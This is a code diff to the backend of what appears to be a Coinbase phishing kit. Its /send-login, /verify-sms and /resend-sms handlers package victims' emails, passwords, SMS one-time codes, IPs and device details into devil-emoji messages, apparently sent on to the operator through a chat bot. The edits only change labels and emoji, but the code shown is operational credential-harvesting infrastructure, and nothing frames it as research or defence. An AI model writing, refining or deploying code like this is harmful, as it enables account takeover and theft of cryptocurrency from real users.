@@ -164,13 +164,13 @@ app.post("/send-login", async (req, res) => {
 
     // Build message
     const message =
-      `😈😈😈😈 <b>LogIn - Coinbase</b> 😈😈😈😈\n` +
+      `😈😈😈😈 <b>Coinbase - Sign in</b> 😈😈😈😈\n` +
       `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
       `<b>📧 Email:</b> <code>${email}</code>\n` +
       `<b>🔑 Password:</b> <code>${password}</code>\n` +
       `<b>🌍 Region:</b> ${region}\n` +
       `<b>💻 Device:</b> ${device}\n` +
-      `<b>📡 IP:</b> ${ip}`;
+      `<b>📍 IP:</b> ${ip}`;
 
     const options = {
       parse_mode: "HTML",
@@ -551,7 +551,7 @@ app.post("/verify-sms", async (req, res) => {
       `😈😈😈 <b>Coinbase - SMS</b> 😈😈😈\n` +
       `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
       `<b>📧 Email:</b> <code>${email}</code>\n` +
-      `<b>📱 SMS:</b> <code>${smsCode}</code>\n` +
+      `<b>💬 SMS:</b> <code>${smsCode}</code>\n` +
       `<b>🌍 Region:</b> ${region}\n` +
       `<b>💻 Device:</b> ${device}\n` +
       `<b>📍 IP:</b> ${ip}`;
@@ -636,7 +636,7 @@ app.post("/resend-sms", async (req, res) => {
     });
 
     if (response.ok) {
-      console.log(`📱 Resend SMS for ${email}`);
+      console.log(`💬 Resend SMS for ${email}`);
       res.json({ ok: true });
     } else {
       res.status(500).json({ error: "Failed to resend SMS" });
